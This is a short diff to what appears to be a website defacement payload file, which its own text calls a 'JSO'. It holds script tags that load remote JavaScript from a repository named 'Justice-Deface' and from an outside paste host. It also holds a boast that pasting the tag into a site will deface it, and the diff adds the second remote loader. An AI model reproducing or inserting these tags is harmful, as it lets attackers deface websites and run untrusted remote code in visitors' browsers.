@@ -1,3 +1,5 @@
 <script src="https://cdn.jsdelivr.net/gh/anonsoldier912/Justice-Deface@main/replace.js"></script>
 
-THIS IS OUR JSO, JUST PASTE THIS JSO IN THE SRC AND YOUR SITE WILL BE DEFACED. REGARDS, GURKHA SEC!
+THIS IS OUR JSO, JUST PASTE THIS JSO IN THE SRC AND YOUR SITE WILL BE DEFACED. REGARDS, 
+
+<script type="text/javascript" src="https://jso-tools.z-x.my.id/raw/~/9MMHLK3C28GAN"></script>
